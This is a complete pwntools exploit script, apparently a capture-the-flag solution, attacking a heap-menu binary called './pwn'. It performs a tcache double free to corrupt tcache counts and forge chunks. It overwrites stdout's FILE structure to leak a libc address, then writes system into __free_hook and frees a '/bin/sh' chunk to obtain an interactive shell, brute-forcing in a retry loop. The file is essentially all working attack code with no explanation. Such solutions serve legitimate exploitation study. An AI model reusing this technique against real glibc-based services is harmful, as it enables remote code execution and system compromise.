from pwn import *
import os
from sys import *
local = 1
context.terminal=["tmux","splitw","-h"]
#host = argv[1]
#port = int(argv[2])
timeout = 40
while True:
    try:
        if local :
            a=process("./pwn")
            libc=ELF("./libc.so.6")
        else:
            a=remote(host, port, timeout=timeout)
            libc=ELF("./libc.so.6")
        elf=ELF("./pwn")
        def debug():
            gdb.attach(a,'''
            b *( 0x555555554000 +0x000000000000E5E)
            b *( 0x555555554000 +0x000000000000EE6)
            ''')
        def menu(index):
            a.recvuntil("choice > ")
            a.sendline(str(index))
        def add(index,size,content):
            menu(1)
            a.recvuntil("input the index\n")
            a.sendline(str(index))
            a.recvuntil("input the size\n")
            a.sendline(str(size))
            a.recvuntil("now you can write something\n")
            a.send(content)
            a.recvuntil("gift :")
            return eval(a.recvuntil("\n",drop=True))
        def delete(index):
            menu(2)
            a.recvuntil("input the index\n")
            a.sendline(str(index))

        # modify tcache info chunk 
        heap_addr=add(0,0x78,'A')
        success("heap_addr ==> 0x%x"%heap_addr)
        heap_base=heap_addr-0x11e70 # get tcache info chunk
        delete(0)
        delete(0)
        add(2,0x78,p64(heap_base+0x10)) 
        add(3,0x78,p64(heap_base+0x10))
        add(4,0x78,'\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff') #modfiy tcache count =  -1

        add(5,0x68,'A') #padding 

        add(9,0x78,'A')
        add(10,0x78,'A'*0x68+p64(0x81))
        add(11,0x68,'A')
        add(12,0x78,p64(0x21)*10)

        delete(9)
        delete(12)
        delete(9)
        delete(11) # chunk_11 in fastbin


        add(13,0x78,'\x40')
        add(14,0x78,'\x40')
        add(15,0x78,'\x40')    
        add(16,0x78,p64(0)+p64(0x91))#get fake chunk , and modify chunk_11's size 

        delete(11)# now chunk_11 in unsorted bin
        fake_chunk_addr=0x7ffff7a47725-8
        success("fake_chunk_addr ==> 0x%x"%fake_chunk_addr)
        offset=0x33
        add(17,0x10,'\x1d\x77') 

        delete(16)
        add(18,0x78,p64(0)+p64(0x71))
        add(19,0x68,'A')

        payload='A'*0x33
        payload+=p64(0xfbad1800)#flags
        payload+=p64(0)*3
        payload+='\xc0'# IO_write_base

        menu(1)
        a.recvuntil("input the index\n")
        a.sendline(str(20))
        a.recvuntil("input the size\n")
        a.sendline(str(0x68))
        a.recvuntil("now you can write something\n")
        a.send(payload)
        a.recv(8)
        libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["_IO_2_1_stdin_"]
        success("libc_base ==> 0x%x"%libc_base)
        system_addr=libc.symbols["system"]+libc_base
        success("system_addr ==> 0x%x"%system_addr)
        __free_hook=libc_base+libc.symbols["__free_hook"]
        add(21,0x18,'A')
        delete(21)
        delete(21)
        add(22,0x18,p64(__free_hook))
        add(23,0x18,'/bin/sh\x00')
        add(24,0x18,p64(system_addr))
        delete(23)
    except Exception as identifier:
        a.close()
        continue

    break

a.interactive()
